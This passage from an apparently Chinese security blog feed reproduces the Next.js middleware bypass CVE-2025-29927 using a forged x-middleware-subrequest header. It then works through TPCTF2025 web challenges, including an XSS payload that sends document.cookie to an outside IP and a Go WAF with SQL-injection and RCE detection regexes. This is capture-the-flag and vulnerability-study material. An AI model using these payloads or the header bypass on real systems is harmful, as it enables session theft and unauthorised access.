class_">Promise</span>.<span class="title function_">resolve</span>(),</span><br><span class="line">      <span class="attr">response</span>: <span class="keyword">new</span> runtime.<span class="property">context</span>.<span class="title class_">Response</span>(<span class="literal">null</span>, &#123;</span><br><span class="line">        <span class="attr">headers</span>: &#123;</span><br><span class="line">          <span class="string">&#x27;x-middleware-next&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">      &#125;),</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>那么目前就是寻找中间件名称了，而在高版本，对中间件的文件又要了要求，中间件文件更名为 <code>middleware.ts</code>，位于 <code>src/</code> 或根目录。此时，攻击者只需设置 <code>x-middleware-subrequest: middleware</code> 或 <code>x-middleware-subrequest: src/middleware</code> 即可绕过。</p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>升级 Next.js 版本</p><blockquote><ul><li>≥15.2.3（15.x）</li><li>≥14.2.25（14.x）</li></ul></blockquote><p>直接看github上的官方的commit</p><p><a href="https://github.com/vercel/next.js/commit/9704c8e9fcc58236349ed787903831579440a879">https://github.com/vercel/next.js/commit/9704c8e9fcc58236349ed787903831579440a879</a></p><img src="/2025/03/31/Next-js%E4%B8%AD%E9%97%B4%E4%BB%B6%E9%89%B4%E6%9D%83%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2025-29927/image-20250331153719392.png" class="" title="This is an example image"><p>官方修复就是直接删掉x-middleware-subrequest请求头</p><p>参考文章：</p><p><a href="https://govuln.com/topic/">https://govuln.com/topic/</a></p><p><a href="https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware">https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware</a></p><p><a href="https://xz.aliyun.com/news/17406?time__1311=eqUxn7DQG=eqBDBdPdK0QOGQNPY5q63x&u_atoken=61d9e3cacb71fd68c52f2ec066d76aa9&u_asig=1a0c380917433328356222442e009d">https://xz.aliyun.com/news/17406?time__1311=eqUxn7DQG%3DeqBDBdPdK0QOGQNPY5q63x&amp;u_atoken=61d9e3cacb71fd68c52f2ec066d76aa9&amp;u_asig=1a0c380917433328356222442e009d</a></p><p><a href="https://xz.aliyun.com/news/17403?u_atoken=7a1e484af2e2cf99ecceeef1933abf0b&u_asig=1a0c380917433328366722478e009d">https://xz.aliyun.com/news/17403?u_atoken=7a1e484af2e2cf99ecceeef1933abf0b&amp;u_asig=1a0c380917433328366722478e009d</a></p><p><a href="https://forum.butian.net/article/679">https://forum.butian.net/article/679</a></p>]]></content>
      
      
      <categories>
          
          <category> CVE复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TPCTF2025 wp</title>
      <link href="/2025/03/30/TPCTF2025-wp/"/>
      <url>/2025/03/30/TPCTF2025-wp/</url>
      
        <content type="html"><![CDATA[<h2 id="baby-layout"><a href="#baby-layout" class="headerlink" title="baby layout"></a>baby layout</h2><p>web：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> express <span class="keyword">from</span> <span class="string">&#x27;express&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> session <span class="keyword">from</span> <span class="string">&#x27;express-session&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> rateLimit <span class="keyword">from</span> <span class="string">&#x27;express-rate-limit&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; randomBytes &#125; <span class="keyword">from</span> <span class="string">&#x27;crypto&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> createDOMPurify <span class="keyword">from</span> <span class="string">&#x27;dompurify&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="variable constant_">JSDOM</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;jsdom&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123; <span class="variable language_">window</span> &#125; = <span class="keyword">new</span> <span class="title function_">JSDOM</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">DOMPurify</span> = <span class="title function_">createDOMPurify</span>(<span class="variable language_">window</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> posts = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">DEFAULT_LAYOUT</span> = <span class="string">`</span></span><br><span class="line"><span class="string">&lt;article&gt;</span></span><br><span class="line"><span class="string">  &lt;h1&gt;Blog Post&lt;/h1&gt;</span></span><br><span class="line"><span class="string">  &lt;div&gt;&#123;&#123;content&#125;&#125;&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/article&gt;</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">LENGTH_LIMIT</span> = <span class="number">500</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (process.<span class="property">env</span>.<span class="property">NODE_ENV</span> === <span class="string">&#x27;production&#x27;</span>) &#123;</span><br><span class="line">  app.<span class="title function_">use</span>(</span><br><span class="line">    <span class="string">&#x27;/api&#x27;</span>,</span><br><span class="line">    <span class="title function_">rateLimit</span>(&#123;</span><br><span class="line">      <span class="attr">windowMs</span>: <span class="number">60</span> * <span class="number">1000</span>,</span><br><span class="line">      <span class="attr">max</span>: <span class="number">10</span>,</span><br><span class="line">    &#125;),</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">session</span>(&#123;</span><br><span class="line">  <span class="attr">secret</span>: <span class="title function_">randomBytes</span>(<span class="number">32</span>).<span class="title function_">toString</span>(<span class="string">&#x27;hex&#x27;</span>),</span><br><span class="line">  <span class="attr">resave</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">saveUninitialized</span>: <span class="literal">false</span>,</span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params">req, _, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">layouts</span>) &#123;</span><br><span class="line">    req.<span class="property">session</span>.<span class="property">layouts</span> = [<span class="variable constant_">DEFAULT_LAYOUT</span>];</span><br><span class="line">    req.<span class="property">session</span>.<span class="property">posts</span> = [];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">next</span>();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.<span class="title function_">setHeader</span>(<span class="string">&#x27;Cache-Control&#x27;</span>, <span class="string">&#x27;no-store&#x27;</span>);</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;home&#x27;</span>, &#123;</span><br><span class="line">    <span class="attr">posts</span>: req.<span class="property">session</span>.<span class="property">posts</span>,</span><br><span class="line">    <span class="attr">maxLayout</span>: req.<span class="property">session</span>.<span class="property">layouts</span>.<span class="property">length</span> - <span class="number">1</span>,</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/api/post&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; content, layoutId &#125; = req.<span class="property">body</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> content !== <span class="string">&#x27;string&#x27;</span> || <span class="keyword">typeof</span> layoutId !== <span class="string">&#x27;number&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Invalid params&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (content.<span class="property">length</span> &gt; <span class="variable constant_">LENGTH_LIMIT</span>) <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Content too long&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> layout = req.<span class="property">session</span>.<span class="property">layouts</span>[layoutId];</span><br><span class="line">  <span class="keyword">if</span> (layout === <span class="literal">undefined</span>) <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Layout not found&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> sanitizedContent = <span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(content);</span><br><span class="line">  <span class="keyword">const</span> body = layout.<span class="title function_">replace</span>(<span class="regexp">/\&#123;\&#123;content\&#125;\&#125;/g</span>, <span class="function">() =&gt;</span> sanitizedContent);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (body.<span class="property">length</span> &gt; <span class="variable constant_">LENGTH_LIMIT</span>) <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Post too long&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> id = <span class="title function_">randomBytes</span>(<span class="number">16</span>).<span class="title function_">toString</span>(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">  posts.<span class="title function_">set</span>(id, body);</span><br><span class="line">  req.<span class="property">session</span>.<span class="property">posts</span>.<span class="title function_">push</span>(id);</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Post <span class="subst">$&#123;id&#125;</span> <span class="subst">$&#123;Buffer.<span class="keyword">from</span>(layout).toString(<span class="string">&#x27;base64&#x27;</span>)&#125;</span> <span class="subst">$&#123;Buffer.<span class="keyword">from</span>(sanitizedContent).toString(<span class="string">&#x27;base64&#x27;</span>)&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; id &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/api/layout&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; layout &#125; = req.<span class="property">body</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> layout !== <span class="string">&#x27;string&#x27;</span>) <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Invalid param&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> (layout.<span class="property">length</span> &gt; <span class="variable constant_">LENGTH_LIMIT</span>) <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Layout too large&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> sanitizedLayout = <span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(layout);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> id = req.<span class="property">session</span>.<span class="property">layouts</span>.<span class="property">length</span>;</span><br><span class="line">  req.<span class="property">session</span>.<span class="property">layouts</span>.<span class="title function_">push</span>(sanitizedLayout);</span><br><span class="line">  <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; id &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/post/:id&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; id &#125; = req.<span class="property">params</span>;</span><br><span class="line">  <span class="keyword">const</span> body = posts.<span class="title function_">get</span>(id);</span><br><span class="line">  <span class="keyword">if</span> (body === <span class="literal">undefined</span>) <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">404</span>).<span class="title function_">send</span>(<span class="string">&#x27;Post not found&#x27;</span>);</span><br><span class="line">  <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;post&#x27;</span>, &#123; id, body &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/api/clear&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  req.<span class="property">session</span>.<span class="property">layouts</span> = [<span class="variable constant_">DEFAULT_LAYOUT</span>];</span><br><span class="line">  req.<span class="property">session</span>.<span class="property">posts</span> = [];</span><br><span class="line">  <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&#x27;cleared&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Web server running on port 3000&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里主要需要审计的就是web的代码，bot其实就是携带flag来访问。</p><p>来看看两个路由&#x2F;api&#x2F;layout，&#x2F;api&#x2F;post</p><p>对应页面中的功能点Create New Layout和Create New Post</p><p>第一个是设计模板，第二个是依据模板投递内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const body = layout.replace(/\&#123;\&#123;content\&#125;\&#125;/g, () =&gt; sanitizedContent);</span><br></pre></td></tr></table></figure><p>此处存在替换，就是把预定义的内容替换成POST的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const sanitizedContent = DOMPurify.sanitize(content);</span><br><span class="line">const sanitizedLayout = DOMPurify.sanitize(layout);</span><br></pre></td></tr></table></figure><p>同时我们也发现两处功能点都是存在保护措施的。有点难办。</p><p>这样的话，我们唯一能考虑的就是拼接了，让两个都不会被过滤，但是合起来又是恶意的！</p><p>尝试构造payload：此处的payload是不会被过滤掉的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;&#123;&#123;content&#125;&#125;&quot;&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x&quot; onerror=&quot;window.open(&#x27;http://156.238.233.113:4567/?cookie=&#x27;+document.cookie)</span><br></pre></td></tr></table></figure><img src="/2025/03/30/TPCTF2025-wp/image-20250324194507206.png" class="" title="This is an example image"><img src="/2025/03/30/TPCTF2025-wp/image-20250324194451759.png" class="" title="This is an example image"><p>然后在3000端口的web上输入以后</p><img src="/2025/03/30/TPCTF2025-wp/image-20250324194602300.png" class="" title="This is an example image"><p>感觉已经拿捏了，再用id在bot上让bot去访问！</p><img src="/2025/03/30/TPCTF2025-wp/image-20250324194628528.png" class="" title="This is an example image"><p>直接拿捏！！</p><h2 id="supersqli"><a href="#supersqli" class="headerlink" title="supersqli"></a>supersqli</h2><p>题目一眼sql注入，根据下载到的源码，可以知道是sqlite数据库</p><p>接下来关注一下源码，The Most Important！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render</span><br><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> connection</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create your views here.</span></span><br><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse,HttpRequest</span><br><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> AdminUser,Blog</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request:HttpRequest</span>):</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">&#x27;Welcome to TPCTF 2025&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>(<span class="params">request:HttpRequest</span>):</span><br><span class="line">    <span class="keyword">if</span> request.method != <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> HttpResponse(<span class="string">&#x27;Welcome to TPCTF 2025&#x27;</span>)</span><br><span class="line">    username = request.POST.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> username != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> HttpResponse(<span class="string">&#x27;you are not admin.&#x27;</span>)</span><br><span class="line">    password = request.POST.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">    users:AdminUser = AdminUser.objects.raw(<span class="string">&quot;SELECT * FROM blog_adminuser WHERE username=&#x27;%s&#x27; and password =&#x27;%s&#x27;&quot;</span> % (username,password))</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">assert</span> password == users[<span class="number">0</span>].password</span><br><span class="line">        <span class="keyword">return</span> HttpResponse(os.environ.get(<span class="string">&#x27;FLAG&#x27;</span>))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> HttpResponse(<span class="string">&#x27;wrong password&#x27;</span>)</span><br></pre></td></tr></table></figure><p>访问&#x2F;flag&#x2F;目录，需要POST请求，传参username为admin和password，</p><p>接下来获取flag的化需要经过断言assert password &#x3D;&#x3D; users[0].password，users又来自于users:AdminUser &#x3D; AdminUser.objects.raw(“SELECT * FROM blog_adminuser WHERE username&#x3D;’%s’ and password &#x3D;’%s’” % (username,password))</p><p>这里就感觉很熟悉了，sql注入里有一种姿势叫quine注入！</p><blockquote><p>Quine又称为自产生程序，在sql注入中是一种使得输入的sql语句和输出的sql语句一致的技术，就是说输入的语句进行查询后生成的结果与输入的语句相同（自己生成自己），可以看到题目中的判断正是考察了这个点。</p></blockquote><p>但是题目怎么会这么简单呢？是存在waf的，我们看go程序</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;bytes&quot;</span></span><br><span class="line"><span class="string">&quot;io&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;mime&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;regexp&quot;</span></span><br><span class="line"><span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> backendURL = <span class="string">&quot;http://127.0.0.1:8000&quot;</span></span><br><span class="line"><span class="keyword">const</span> backendHost = <span class="string">&quot;127.0.0.1:8000&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> blockedIPs = <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">bool</span>&#123;</span><br><span class="line"><span class="string">&quot;1.1.1.1&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> sqlInjectionPattern = regexp.MustCompile(<span class="string">`(?i)(union.*select|select.*from|insert.*into|update.*set|delete.*from|drop\s+table|--|#|\*\/|\/\*)`</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> rcePattern = regexp.MustCompile(<span class="string">`(?i)(\b(?:os|exec|system|eval|passthru|shell_exec|phpinfo|popen|proc_open|pcntl_exec|assert)\s*\(.+\))`</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> hotfixPattern = regexp.MustCompile(<span class="string">`(?i)(select)`</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> blockedUserAgents = []<span class="type">string</span>&#123;</span><br><span class="line"><span class="string">&quot;sqlmap&quot;</span>,</span><br><span class="line"><span class="string">&quot;nmap&quot;</span>,</span><br><span class="line"><span class="string">&quot;curl&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">isBlockedIP</span><span class="params">(ip <span class="type">string</span>)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line"><span class="keyword">return</span> blockedIPs[ip]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">isMaliciousRequest</span><span class="params">(r *http.Request)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line"><span class="keyword">for</span> key, values := <span class="keyword">range</span> r.URL.Query() &#123;</span><br><span class="line"><span class="keyword">for</span> _, value := <span class="keyword">range</span> values &#123;</span><br><span class="line"><span class="keyword">if</span> sqlInjectionPattern.MatchString(value) &#123;</span><br><span class="line">log.Printf(<span class="string">&quot;阻止 SQL 注入: 参数 %s=%s&quot;</span>, key, value)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> rcePattern.MatchString(value) &#123;</span><br><span class="line">log.Printf(<span class="string">&quot;阻止 RCE 攻击: 参数 %s=%s&quot;</span>, key, value)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> hotfixPattern.MatchString(value) &#123;</span><br><span class="line">log.Printf(<span class="string">&quot;参数 %s=%s&quot;</span>, key, value)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> r.Method == http.MethodPost &#123;</span><br><span class="line">ct := r.Header.Get(<span class="string">&quot;Content-Type&quot;</span>)</span><br><span class="line">mediaType, _, err := mime.ParseMediaType(ct)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Printf(<span class="string">&quot;解析 Content-Type 失败: %v&quot;</span>, err)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> mediaType == <span class="string">&quot;multipart/form-data&quot;</span> &#123;</span><br><span class="line"><span class="keyword">if</span> err := r.ParseMultipartForm(<span class="number">65535</span>); err != <span class="literal">nil</span> &#123;</span><br><span 